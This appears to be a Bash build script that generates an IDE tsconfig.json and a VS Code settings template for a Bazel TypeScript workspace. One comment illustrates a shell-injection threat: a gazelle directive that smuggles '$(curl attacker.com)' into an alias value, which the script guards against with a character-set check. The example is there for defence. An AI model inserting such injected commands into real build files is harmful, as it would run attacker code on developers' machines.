#!/usr/bin/env bash
# refresh_tsconfig.sh — Generate a workspace-root tsconfig.json for IDE consumption.
#
# Usage:
#   bazel run //:refresh_tsconfig
#
# What it does:
#   1. Queries all ts_compile targets in the workspace via `bazel query`.
#   2. For each target, derives the Bazel package path (e.g. "src/utils").
#   3. Writes a workspace-root tsconfig.json with:
#      - compilerOptions.paths mapping each package to its source directory
#      - compilerOptions.rootDirs including bazel-bin so the IDE can find .d.ts
#      - references pointing to each package's tsconfig.json (when one exists)
#   4. Writes a VS Code workspace settings template (.vscode/settings.json.template).
#
# The generated tsconfig.json is for IDE use only — it is NOT used by Bazel
# itself.  Bazel generates per-target tsconfigs inside the action sandbox.
#
# Re-run this script whenever you add or remove ts_compile targets.

set -euo pipefail

# ── Locate workspace root ──────────────────────────────────────────────────────
# When run with `bazel run`, BUILD_WORKSPACE_DIRECTORY is set to the workspace
# root by Bazel (since Bazel 5).
if [[ -z "${BUILD_WORKSPACE_DIRECTORY:-}" ]]; then
  echo "ERROR: BUILD_WORKSPACE_DIRECTORY is not set." >&2
  echo "Run this script via:  bazel run //:refresh_tsconfig" >&2
  exit 1
fi

WORKSPACE="$BUILD_WORKSPACE_DIRECTORY"
cd "$WORKSPACE"

# ── Helpers ────────────────────────────────────────────────────────────────────
log() { echo "[refresh_tsconfig] $*"; }

# bazel-bin symlink relative to workspace root
BAZEL_BIN="bazel-bin"

# ── Query ts_compile targets ────────────────────────────────────────────────────
log "Querying ts_compile targets..."

# Use bazel query to find all ts_compile rule targets.
# We filter by kind("ts_compile rule") which matches both the wrapper macro
# output and the underlying _ts_compile_rule.  The query result is a list of
# target labels, one per line, e.g.:
#   //src/utils:utils
#   //src/components:components
TARGETS=$(bazel query 'kind("ts_compile rule", //...)' 2>/dev/null || true)

if [[ -z "$TARGETS" ]]; then
  log "No ts_compile targets found. Is this a rules_typescript workspace?"
  log "Generating a minimal tsconfig.json with just rootDirs..."
  TARGETS=""
fi

# ── Extract unique packages ────────────────────────────────────────────────────
# From each label like //src/utils:utils, extract the package path: src/utils
declare -a PACKAGES=()
declare -A SEEN_PACKAGES=()

while IFS= read -r label; do
  [[ -z "$label" ]] && continue
  # Strip leading // and take everything before the colon.
  pkg="${label#//}"
  pkg="${pkg%%:*}"
  # Skip the root package (empty string)
  [[ -z "$pkg" ]] && continue
  if [[ -z "${SEEN_PACKAGES[$pkg]+x}" ]]; then
    PACKAGES+=("$pkg")
    SEEN_PACKAGES["$pkg"]=1
  fi
done <<< "$TARGETS"

log "Found ${#PACKAGES[@]} packages with ts_compile targets."

# ── Generate tsconfig.json ─────────────────────────────────────────────────────
TSCONFIG="$WORKSPACE/tsconfig.json"
log "Writing $TSCONFIG ..."

# ── Extract path aliases from Gazelle directives ────────────────────────────────
# Read # gazelle:ts_path_alias directives from root BUILD.bazel and any
# BUILD.bazel files in the workspace. These directives map TypeScript path
# alias prefixes (e.g. "@/") to workspace-relative directories (e.g. "src/"),
# allowing the IDE to resolve path-aliased imports correctly.
#
# Format:  # gazelle:ts_path_alias <alias_prefix> <workspace-relative-dir>
# Example: # gazelle:ts_path_alias @/ src/
ALIAS_PATHS_ENTRIES=""

declare -A SEEN_ALIAS_KEYS=()

while IFS= read -r line; do
  # Extract alias and directory from the directive value
  # The directive format after stripping the prefix is: <alias> <dir>
  directive_value="${line#*gazelle:ts_path_alias }"
  # Split on first space
  alias_prefix="${directive_value%% *}"
  alias_dir="${directive_value#* }"

  # Normalise: strip trailing slashes, skip empty or invalid entries
  alias_prefix="${alias_prefix%/}"
  alias_dir="${alias_dir%/}"
  [[ -z "$alias_prefix" || -z "$alias_dir" || "$alias_prefix" == "$alias_dir" ]] && continue
  # Validate alias values against a safe character set to prevent shell injection.
  # A malicious directive like `# gazelle:ts_path_alias @/ $(curl attacker.com)`
  # would otherwise execute during heredoc expansion.
  if [[ ! "$alias_prefix" =~ ^[A-Za-z0-9@/_.*-]+$ ]]; then
    echo "ERROR: unsafe characters in alias prefix: '$alias_prefix'" >&2
    exit 1
  fi
  if [[ ! "$alias_dir" =~ ^[A-Za-z0-9@/_.*-]+$ ]]; then
    echo "ERROR: unsafe characters in alias directory: '$alias_dir'" >&2
    exit 1
  fi
  # Skip if this alias key was already added (first occurrence wins)
  [[ -n "${SEEN_ALIAS_KEYS[$alias_prefix]+x}" ]] && continue
  SEEN_ALIAS_KEYS["$alias_prefix"]=1

  src_dir="./${alias_dir}"
  bin_dir="./$BAZEL_BIN/${alias_dir}"

  ALIAS_PATHS_ENTRIES+="    \"${alias_prefix}\": [\"${src_dir}/index\"],
    \"${alias_prefix}/*\": [\"${src_dir}/*\", \"${bin_dir}/*\"],
"
done < <(grep -r "gazelle:ts_path_alias" "$WORKSPACE" \
           --include="BUILD.bazel" --include="BUILD" \
           -h 2>/dev/null | grep "gazelle:ts_path_alias")

if [[ -n "$ALIAS_PATHS_ENTRIES" ]]; then
  log "Injecting path aliases from # gazelle:ts_path_alias directives."
fi

# Build the paths block — maps each package's module name to its source dir.
# Convention: a package at src/utils is reachable as "@/utils" (if the package
# starts with src/) or as the full package path.
# We generate both forms: "@/<tail>" and the full package path.
PATHS_ENTRIES=""
REFERENCES_ENTRIES=""

for pkg in "${PACKAGES[@]}"; do
  # Path alias: @/<rest-after-src/> if the package starts with src/,
  # otherwise use the full package path as the alias key.
  if [[ "$pkg" == src/* ]]; then
    alias_key="@/${pkg#src/}"
  else
    alias_key="$pkg"
  fi

  # Source directory (relative to workspace root)
  src_dir="./$pkg"
  # bazel-bin compiled .js/.d.ts outputs for this package
  bin_dir="./$BAZEL_BIN/$pkg"

  PATHS_ENTRIES+="    \"${alias_key}\": [\"${src_dir}/index\"],
    \"${alias_key}/*\": [\"${src_dir}/*\", \"${bin_dir}/*\"],
"

  # References: include a per-package tsconfig.json if it exists.
  pkg_tsconfig="$WORKSPACE/$pkg/tsconfig.json"
  if [[ -f "$pkg_tsconfig" ]]; then
    REFERENCES_ENTRIES+="    { \"path\": \"./$pkg\" },
"
  fi
done

# Merge directive-sourced aliases (higher priority) with package-derived paths.
# Directive aliases come first so they appear at the top of the paths map and
# so that duplicate keys from PATHS_ENTRIES do not shadow them.
ALL_PATHS_ENTRIES="${ALIAS_PATHS_ENTRIES}${PATHS_ENTRIES}"

# Trim trailing comma+newline from the last entries for valid JSON.
ALL_PATHS_ENTRIES="${ALL_PATHS_ENTRIES%,
}"
REFERENCES_ENTRIES="${REFERENCES_ENTRIES%,
}"

# Build references array (may be empty)
if [[ -n "$REFERENCES_ENTRIES" ]]; then
  REFS_BLOCK="\"references\": [
$REFERENCES_ENTRIES  ],"
else
  REFS_BLOCK="\"references\": [],"
fi

# Build paths block (may be empty)
if [[ -n "$ALL_PATHS_ENTRIES" ]]; then
  PATHS_BLOCK="\"paths\": {
$ALL_PATHS_ENTRIES    },"
else
  PATHS_BLOCK=""
fi

cat > "$TSCONFIG" <<EOF
{
  "_comment": "Generated by 'bazel run //:refresh_tsconfig'. Do not edit manually — re-run to update.",
  "compilerOptions": {
    "strict": true,
    "target": "ES2022",
    "module": "Preserve",
    "moduleResolution": "Bundler",
    "jsx": "react-jsx",
    "declaration": true,
    "sourceMap": true,
    "skipLibCheck": true,
    "esModuleInterop": true,
    "allowArbitraryExtensions": true,
    "rootDirs": [
      ".",
      "./$BAZEL_BIN"
    ],
    "baseUrl": ".",
    $PATHS_BLOCK
    "noEmit": true
  },
  $REFS_BLOCK
  "exclude": [
    "bazel-*",
    "node_modules",
    "dist",
    "build",
    ".next",
    ".nuxt"
  ]
}
EOF

log "Wrote $TSCONFIG"

# ── Generate .vscode/settings.json.template ────────────────────────────────────
VSCODE_DIR="$WORKSPACE/.vscode"
SETTINGS_TEMPLATE="$VSCODE_DIR/settings.json.template"

mkdir -p "$VSCODE_DIR"

# Only write if the template doesn't already exist, to avoid overwriting user
# customizations.  Users can re-run with --force to overwrite.
if [[ ! -f "$SETTINGS_TEMPLATE" ]] || [[ "${1:-}" == "--force" ]]; then
  log "Writing $SETTINGS_TEMPLATE ..."
  cat > "$SETTINGS_TEMPLATE" <<'VSCODE_EOF'
{
  "_instructions": "Copy this file to .vscode/settings.json (or merge it into your existing settings.json). This file is intentionally named .template so it does not conflict with your personal VS Code settings.",

  "typescript.tsdk": "node_modules/typescript/lib",
  "typescript.enablePromptUseWorkspaceTsdk": true,
  "typescript.preferences.importModuleSpecifier": "relative",

  "editor.formatOnSave": true,
  "editor.defaultFormatter": "esbenp.prettier-vscode",
  "[typescript]": {
    "editor.defaultFormatter": "esbenp.prettier-vscode"
  },
  "[typescriptreact]": {
    "editor.defaultFormatter": "esbenp.prettier-vscode"
  },

  "files.watcherExclude": {
    "**/bazel-bin/**": true,
    "**/bazel-out/**": true,
    "**/bazel-testlogs/**": true,
    "**/bazel-rules_typescript/**": true
  },
  "search.exclude": {
    "**/bazel-bin": true,
    "**/bazel-out": true,
    "**/bazel-testlogs": true,
    "**/bazel-rules_typescript": true
  }
}
VSCODE_EOF
  log "Wrote $SETTINGS_TEMPLATE"
else
  log "$SETTINGS_TEMPLATE already exists — skipping (run with --force to overwrite)."
fi

# ── Summary ────────────────────────────────────────────────────────────────────
echo ""
echo "Done.  IDE tsconfig generated at:"
echo "  $TSCONFIG"
echo ""
echo "Next steps:"
echo "  1. Open VS Code in the workspace root."
echo "  2. If you haven't already, copy .vscode/settings.json.template to .vscode/settings.json"
echo "  3. Run 'bazel build //...' once to populate bazel-bin with .d.ts files."
echo "  4. Restart the TypeScript language server in VS Code:"
echo "     Cmd+Shift+P → 'TypeScript: Restart TS Server'"
echo ""
echo "Re-run this command whenever you add or remove ts_compile targets:"
echo "  bazel run //:refresh_tsconfig"
